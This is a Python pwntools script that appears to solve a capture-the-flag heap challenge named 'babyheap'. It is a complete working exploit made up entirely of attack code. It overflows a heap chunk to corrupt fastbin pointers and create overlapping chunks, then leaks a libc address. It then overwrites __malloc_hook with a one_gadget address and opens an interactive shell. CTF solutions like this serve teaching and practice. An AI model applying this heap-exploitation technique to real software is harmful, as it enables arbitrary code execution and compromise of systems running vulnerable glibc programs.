#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("babyheap")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
def alloc(size):
    global index
    io.sendlineafter("Command: ", b'1')
    io.sendlineafter("Size: ", str(size))
def fill(index, content):
    io.sendlineafter("Command: ", b'2')
    io.sendlineafter("Index: ", str(index))
    io.sendlineafter("Size: ", str(len(content)))
    io.sendlineafter("Content: ", content)
def free(index):
    io.sendlineafter("Command: ", b'3')
    io.sendlineafter("Index: ", str(index))
def show(index):
    io.sendlineafter("Command: ", b'4')
    io.sendlineafter("Index: ", str(index))
    io.recvuntil("Content: \n")
    return io.recvline()

io = start()
alloc(0x18)
alloc(0x18)
alloc(0x18)
alloc(0x18)
alloc(0x88)
# pause()
free(1)
free(2)

# pause()

payload = b'A'*0x18 + pack(0x21)
payload += p64(0) + b"A"*8
payload += p64(0) + pack(0x21)
payload += p8(0x80)  # modify chunk2->fd = chunk4

fill(0, payload)
# pause()
payload = b"A"*0x18 + pack(0x21) # modify chunk4->size
fill(3, payload)

alloc(0x18) # chunk1
# pause()
alloc(0x18) # chunk2 overlap chunk4


# leak_libc
payload = b"A"*0x18 + pack(0x91)
fill(3, payload) # recover chunk4->size

alloc(0x88) # avoid mergy  chunk5
free(4)

libc.address = u64(show(2)[:8]) - 0x3c3b78

log.info(f"libc @ {hex(libc.address)}")
# overwrite __malloc_hook
alloc(0x68) # chunk4
free(4)

fill(2, pack(libc.sym.__malloc_hook - 0x23))

alloc(0x68) # chunk4
alloc(0x68) # chunk6

one = [0x45206, 0x4525a, 0xef9f4, 0xf0897]

fill(6, b'a'*0x13 + pack(libc.address + one[1]))
alloc(1)

io.interactive()
